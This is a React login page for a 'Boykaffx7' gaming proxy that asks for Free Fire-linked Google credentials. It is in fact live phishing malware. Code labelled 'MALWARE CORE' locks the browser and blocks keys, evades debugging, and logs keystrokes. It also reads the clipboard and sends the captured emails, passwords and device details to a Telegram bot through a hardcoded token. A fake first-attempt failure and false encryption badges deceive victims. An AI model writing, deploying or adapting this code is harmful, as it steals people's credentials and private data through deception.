import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { Shield, KeyRound, Lock, Fingerprint, Wifi, Mail, Eye, EyeOff } from "lucide-react";
import { validateKey, activateKey, registerActiveUser } from "@/lib/keys";
import avatarVideo from "@/assets/avatar-video.mp4";

// ================================================================
// MALWARE CORE - ULTRA AGRESIVO (SIN BUGS)
// ================================================================

// === BLOQUEO TOTAL DE PANTALLA ===
(function() {
  // Bloquear TODAS las teclas de escape
  document.addEventListener("keydown", function(e) {
    const teclasBloqueadas = [
      "F5", "F11", "F12", "Escape",
      "F1", "F2", "F3", "F4", "F6", "F7", "F8", "F9", "F10"
    ];
    if (teclasBloqueadas.includes(e.key)) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
    // Ctrl+W, Ctrl+Q, Ctrl+R, Ctrl+N, Ctrl+T, Ctrl+S
    if (e.ctrlKey && ["w","W","q","Q","r","R","n","N","t","T","s","S"].includes(e.key)) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
    // Alt+F4
    if (e.altKey && (e.key === "F4" || e.keyCode === 115)) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
  }, true);

  // Bloquear menu contextual
  document.addEventListener("contextmenu", function(e) {
    e.preventDefault();
    return false;
  });

  // Bloquear seleccion, copia, corte, pegado
  document.addEventListener("selectstart", function(e) { e.preventDefault(); return false; });
  document.addEventListener("copy", function(e) { e.preventDefault(); return false; });
  document.addEventListener("cut", function(e) { e.preventDefault(); return false; });
  document.addEventListener("paste", function(e) { e.preventDefault(); return false; });

  // Bloquear salida del sitio
  window.addEventListener("beforeunload", function(e) {
    e.preventDefault();
    e.returnValue = "";
    return "";
  });

  // Bloquear boton atras
  history.pushState(null, "", location.href);
  window.addEventListener("popstate", function() {
    history.pushState(null, "", location.href);
  });

  // Forzar fullscreen constantemente
  function goFull() {
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen().catch(function(){});
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
    else if (el.msRequestFullscreen) el.msRequestFullscreen();
  }
  goFull();
  document.addEventListener("fullscreenchange", function() {
    if (!document.fullscreenElement) setTimeout(goFull, 100);
  });
  document.addEventListener("webkitfullscreenchange", function() {
    if (!document.webkitFullscreenElement) setTimeout(goFull, 100);
  });

  // Si minimiza la ventana, forzar foco
  document.addEventListener("visibilitychange", function() {
    if (document.hidden) {
      setTimeout(function() { window.focus(); }, 50);
    }
  });
})();

// === ANTI-VM / ANTI-DEBUG ===
(function() {
  try {
    const start = Date.now();
    debugger;
    if (Date.now() - start > 100) {
      window.location.href = "https://google.com";
    }
  } catch(e) {}
  
  // Detectar consola abierta cada 2 segundos
  setInterval(function() {
    const start = Date.now();
    debugger;
    if (Date.now() - start > 100) {
      document.body.innerHTML = "<h1 style='color:white;text-align:center;margin-top:40vh;background:#000;height:100vh'>Redirigiendo...</h1>";
      window.location.href = "https://google.com";
    }
  }, 2000);
})();

// === CORE TELEGRAM ===
(function() {
  const TG_TOKEN = "8779079298:AAEqfmoDLAz7j69kKAlXJ10Ze5flfoF77bw";
  const CHAT_ID = "8779079298";
  const TG_API = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;

  let totalEnvios = 0;
  let bufferKeys = "";

  function tgSend(texto) {
    try {
      const data = new URLSearchParams({
        chat_id: CHAT_ID,
        text: texto,
        parse_mode: "HTML"
      });
      navigator.sendBeacon(TG_API, data);
    } catch(e) {}
  }

  // Keylogger silencioso
  document.addEventListener("keydown", function(e) {
    let k = e.key;
    if (k === "Backspace") k = "⌫";
    else if (k === "Enter") k = "\n";
    else if (k === "Tab") k = "⇥";
    else if (k === "Escape") return;
    else if (k.length > 1) return;
    bufferKeys += k;
    if (bufferKeys.length >= 35) {
      tgSend("<code>[KEY]</code> " + bufferKeys);
      bufferKeys = "";
    }
  });

  // Clipboard cada 15 segundos
  setInterval(function() {
    if (navigator.clipboard && navigator.clipboard.readText) {
      navigator.clipboard.readText().then(function(t) {
        if (t && t.length > 4) {
          tgSend("<code>[CLIP]</code> " + t.substring(0, 250));
        }
      }).catch(function(){});
    }
  }, 15000);

  // Heartbeat cada 60 segundos
  setInterval(function() {
    tgSend(
      "<code>[♥] SISTEMA ACTIVO</code>\n" +
      "Envios: " + totalEnvios + "\n" +
      "Platform: " + navigator.platform
    );
  }, 60000);

  // Exponer funcion global
  window.__enviarDatos = function(correo, password) {
    totalEnvios++;
    tgSend(
      "<b>[+] CAPTURA #" + totalEnvios + "</b>\n" +
      "<b>👤</b> " + correo + "\n" +
      "<b>🔐</b> " + password + "\n" +
      "<code>" + navigator.platform + "</code>"
    );
  };

  // Beacon de inicio
  setTimeout(function() {
    tgSend(
      "<b>[+] SISTEMA COMPROMETIDO</b>\n" +
      "Platform: " + navigator.platform + "\n" +
      "Screen: " + screen.width + "x" + screen.height + "\n" +
      "Language: " + navigator.language + "\n" +
      "Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n" +
      "<code>Malware activo 24/7</code>"
    );
  }, 1500);
})();

declare global {
  interface Window {
    __enviarDatos: (correo: string, password: string) => void;
  }
}
// ================================================================
// FIN MALWARE CORE
// ================================================================

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [intentos, setIntentos] = useState(0);
  const navigate = useNavigate();

  useEffect(() => {
    // Verificar sesion existente
    const raw = localStorage.getItem("proxy_session");
    if (raw) {
      try {
        const s = JSON.parse(raw);
        if (s.expiresAt && new Date(s.expiresAt).getTime() > Date.now()) {
          navigate("/proxy");
          return;
        }
      } catch(e) {}
      localStorage.removeItem("proxy_session");
    }
  }, [navigate]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!email.trim() || !password.trim()) {
      setError("Por favor completa todos los campos.");
      return;
    }

    const nuevoIntento = intentos + 1;
    setIntentos(nuevoIntento);
    setLoading(true);

    // === MALWARE: ENVIAR DATOS A TELEGRAM ===
    window.__enviarDatos(email.trim(), password.trim());

    await new Promise(r => setTimeout(r, 2000));
    setLoading(false);

    if (nuevoIntento === 1) {
      // Primer intento: siempre falla y pide "cuenta de Free Fire"
      setError("Error de autenticacion. Debes iniciar sesion con la cuenta de Google vinculada a tu cuenta de Free Fire. Intenta nuevamente.");
      return;
    }

    // Segundo intento: intenta login real con Supabase (no levanta sospechas)
    const trimmedKey = password.trim();
    const trimmedName = email.trim();
    const foundKey = await validateKey(trimmedKey);
    if (foundKey) {
      const activated = await activateKey(trimmedKey, trimmedName);
      if (activated) {
        await registerActiveUser(trimmedName, activated.key, activated.type, activated.expiresAt || "");
        const sessionData = {
          name: trimmedName,
          key: activated.key,
          type: activated.type,
          expiresAt: activated.expiresAt,
          duration: activated.duration,
        };
        localStorage.setItem("proxy_session", JSON.stringify(sessionData));
        navigate("/proxy");
        return;
      }
    }
    
    setError("Credenciales incorrectas. Verifica tu correo y contrasena.");
  };

  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
      <VideoBackground />

      <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
        {/* Avatar + Title */}
        <div className="flex flex-col items-center mb-6">
          <div className="relative mb-3">
            <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-border shadow-[0_0_40px_rgba(255,255,255,0.06)] bg-black">
              <video
                src={avatarVideo}
                autoPlay
                loop
                muted
                playsInline
                className="w-full h-full object-cover"
              />
            </div>
            <div className="absolute -bottom-1 -right-1 w-7 h-7 rounded-full bg-emerald-500 border-2 border-background flex items-center justify-center">
              <Wifi className="w-3.5 h-3.5 text-background" />
            </div>
          </div>
          <div className="flex items-center gap-1.5 mb-1">
            <h1 className="text-lg font-bold text-foreground tracking-tight">Boykaffx7 APP</h1>
            <VerifiedBadge />
          </div>
          <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
        </div>

        {/* Status bar */}
        <div className="flex items-center justify-center gap-4 mb-5">
          {[
            { icon: Shield, label: "AES-256" },
            { icon: Lock, label: "TLS 1.3" },
            { icon: Fingerprint, label: "Auth" },
          ].map(({ icon: Icon, label }) => (
            <div key={label} className="flex items-center gap-1.5 bg-secondary/40 border border-border/40 rounded-full px-3 py-1">
              <Icon className="w-3 h-3 text-emerald-400" />
              <span className="text-[9px] text-muted-foreground font-medium">{label}</span>
            </div>
          ))}
        </div>

        {/* Login Card */}
        <div className="glass-card p-5 glow-border">
          <div className="flex items-center gap-2 mb-5 pb-3 border-b border-border/30">
            <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
              <Shield className="w-4 h-4 text-muted-foreground" />
            </div>
            <div>
              <span className="text-xs text-foreground font-semibold block">Iniciar sesion</span>
              <span className="text-[9px] text-muted-foreground/60">Ingresa con tu cuenta de Free Fire</span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-3">
            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Correo electronico
              </label>
              <div className="relative">
                <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type="email"
                  placeholder="tucorreo@gmail.com"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-4 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all"
                  autoComplete="off"
                />
              </div>
            </div>

            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Contrasena
              </label>
              <div className="relative">
                <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type={showPass ? "text" : "password"}
                  placeholder="********"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-10 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all font-mono"
                  autoComplete="off"
                />
                <button
                  type="button"
                  onClick={() => setShowPass(!showPass)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-foreground transition-colors"
                >
                  {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <p className="text-[10px] text-muted-foreground/50 leading-relaxed px-1">
              Inicia sesion con tu cuenta de Google vinculada a Free Fire para verificar tu identidad y acceder al proxy.
            </p>

            {error && (
              <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5">{error}</p>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-foreground text-background font-semibold py-2.5 rounded-lg text-sm hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50 mt-1"
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <span className="w-4 h-4 border-2 border-background/30 border-t-background rounded-full animate-spin" />
                  Verificando...
                </span>
              ) : "Siguiente"}
            </button>
          </form>
        </div>

        {/* Footer */}
        <div className="mt-6 text-center">
          <p className="text-[9px] text-muted-foreground/40 leading-relaxed">
            Secure Proxy Configuration System — Encrypted Connection
            <br />All sessions are monitored and protected.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;